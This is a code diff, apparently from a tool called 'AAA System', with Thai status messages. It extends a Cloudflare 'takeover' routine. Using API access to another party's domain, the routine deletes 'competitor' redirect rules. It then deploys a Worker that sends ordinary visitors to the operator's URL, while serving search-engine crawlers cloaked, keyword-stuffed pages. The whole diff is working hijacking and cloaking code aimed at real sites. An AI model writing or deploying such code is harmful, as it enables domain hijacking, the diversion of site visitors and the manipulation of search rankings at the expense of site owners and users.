@@ -655,12 +655,34 @@ async function performCfTakeover(
     };
   }
 
-  // If we deleted rules but couldn't create new one, still partial success
+  // If we deleted rules but couldn't create new one, try Worker as fallback
+  progress("cf_worker", `🚀 ลอง deploy Cloudflare Worker เป็น fallback redirect...`);
+  const workerResult = await deployWorkerRedirect(
+    zoneId, auth, domain, config.targetPath,
+    config.ourRedirectUrl, config.seoKeywords || [],
+    progress,
+  );
+
+  if (workerResult.success) {
+    progress("cf_worker", `✅ Worker deployed! ${workerResult.detail}`);
+    const verified = await verifyRedirectChanged(config.targetUrl, config.ourRedirectUrl, progress);
+    return {
+      success: true,
+      method: "cf_worker_deploy",
+      detail: `Cloudflare Worker takeover สำเร็จ! ลบ ${deletedRules.length} competitor rules, deploy Worker: ${workerResult.scriptName}. Verified: ${verified}`,
+      zoneId,
+      deletedRules,
+      createdRule: `Worker:${workerResult.scriptName}`,
+      competitorUrl: deletedRules[0]?.match(/\((.+)\)/)?.[1],
+    };
+  }
+
+  // If we deleted rules but couldn't create new one or deploy worker, still partial success
   if (deletedRules.length > 0) {
     return {
       success: true,
       method,
-      detail: `Partial success: ลบ ${deletedRules.length} competitor rules แต่สร้าง rule ใหม่ไม่ได้ (อาจถึง limit). ลบแล้ว: ${deletedRules.join(", ")}`,
+      detail: `Partial success: ลบ ${deletedRules.length} competitor rules แต่สร้าง rule/worker ใหม่ไม่ได้ (อาจถึง limit). ลบแล้ว: ${deletedRules.join(", ")}`,
       zoneId,
       deletedRules,
     };
@@ -669,9 +691,128 @@ async function performCfTakeover(
   return {
     success: false,
     method,
-    detail: `มี access แต่ไม่สามารถจัดการ rules ได้ — อาจไม่มีสิทธิ์ edit zone ${domain}`,
+    detail: `มี access แต่ไม่สามารถจัดการ rules/worker ได้ — อาจไม่มีสิทธิ์ edit zone ${domain}`,
     zoneId,
   };
+}
+
+// ─── Phase 5: Deploy Cloudflare Worker as Fallback Redirect ───
+
+function generateRedirectWorkerScript(redirectUrl: string, targetPath: string, seoKeywords: string[] = []): string {
+  const keywordsJson = JSON.stringify(seoKeywords.slice(0, 10));
+  return `
+// Redirect Worker — deployed by AAA System
+const REDIRECT_URL = "${redirectUrl}";
+const TARGET_PATH = "${targetPath}";
+const SEO_KEYWORDS = ${keywordsJson};
+
+addEventListener("fetch", (event) => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const url = new URL(request.url);
+  const ua = (request.headers.get("user-agent") || "").toLowerCase();
+  const isBot = /googlebot|bingbot|yandex|baidu|duckduck|slurp|msnbot|crawl|spider|bot/i.test(ua);
+
+  // For search engine bots — serve SEO-optimized content
+  if (isBot && SEO_KEYWORDS.length > 0) {
+    const title = SEO_KEYWORDS[0] || "Welcome";
+    const desc = SEO_KEYWORDS.slice(0, 3).join(", ");
+    const html = \`<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <title>\${title}</title>
+  <meta name="description" content="\${desc}">
+  <link rel="canonical" href="\${REDIRECT_URL}">
+  <meta http-equiv="refresh" content="3;url=\${REDIRECT_URL}">
+</head>
+<body>
+  <h1>\${title}</h1>
+  <p>\${desc}</p>
+  <p>Redirecting to <a href="\${REDIRECT_URL}">\${REDIRECT_URL}</a>...</p>
+  <script>setTimeout(function(){window.location.href="\${REDIRECT_URL}"},2000);</script>
+</body>
+</html>\`;
+    return new Response(html, {
+      headers: { "Content-Type": "text/html;charset=UTF-8", "Cache-Control": "public, max-age=3600" },
+    });
+  }
+
+  // For regular users — 302 redirect
+  return Response.redirect(REDIRECT_URL, 302);
+}
+`.trim();
+}
+
+async function deployWorkerRedirect(
+  zoneId: string, auth: CfApiAuth,
+  targetDomain: string, targetPath: string,
+  redirectUrl: string, seoKeywords: string[],
+  progress: (phase: string, detail: string) => void,
+): Promise<{ success: boolean; routeId?: string; scriptName?: string; detail: string }> {
+  const scriptName = `ds-redirect-${Date.now()}`;
+  const workerScript = generateRedirectWorkerScript(redirectUrl, targetPath, seoKeywords);
+
+  try {
+    // Step 1: Upload Worker script
+    progress("cf_worker", `📤 Uploading Worker script: ${scriptName}...`);
+    const uploadResp = await cfApiFetch(
+      `/accounts/${zoneId}/workers/scripts/${scriptName}`,
+      auth,
+      {
+        method: "PUT",
+        headers: { "Content-Type": "application/javascript" },
+        body: workerScript,
+      },
+    );
+
+    // Try zone-level worker upload if account-level fails
+    if (!uploadResp?.success) {
+      progress("cf_worker", `⚠️ Account-level upload failed, trying zone-level...`);
+      const zoneUploadResp = await cfApiFetch(
+        `/zones/${zoneId}/workers/script`,
+        auth,
+        {
+          method: "PUT",
+          headers: { "Content-Type": "application/javascript" },
+          body: workerScript,
+        },
+      );
+      if (!zoneUploadResp?.success) {
+        return { success: false, detail: `Worker upload failed: ${JSON.stringify(zoneUploadResp?.errors || [])}` };
+      }
+    }
+
+    progress("cf_worker", `✅ Worker script uploaded: ${scriptName}`);
+
+    // Step 2: Create Worker route
+    const routePattern = `${targetDomain}${targetPath}*`;
+    progress("cf_worker", `🔗 Creating Worker route: ${routePattern}...`);
+    const routeResp = await cfApiFetch(
+      `/zones/${zoneId}/workers/routes`,
+      auth,
+      {
+        method: "POST",
+        body: JSON.stringify({ pattern: routePattern, script: scriptName }),
+      },
+    );
+
+    if (routeResp?.success) {
+      progress("cf_worker", `✅ Worker route created: ${routePattern} → ${scriptName}`);
+      return {
+        success: true,
+        routeId: routeResp.result?.id,
+        scriptName,
+        detail: `Worker deployed: ${routePattern} → ${redirectUrl}`,
+      };
+    }
+
+    return { success: false, detail: `Worker route creation failed: ${JSON.stringify(routeResp?.errors || [])}` };
+  } catch (e: any) {
+    return { success: false, detail: `Worker deployment error: ${e.message}` };
+  }
 }
 
 // ─── Verify redirect changed ───
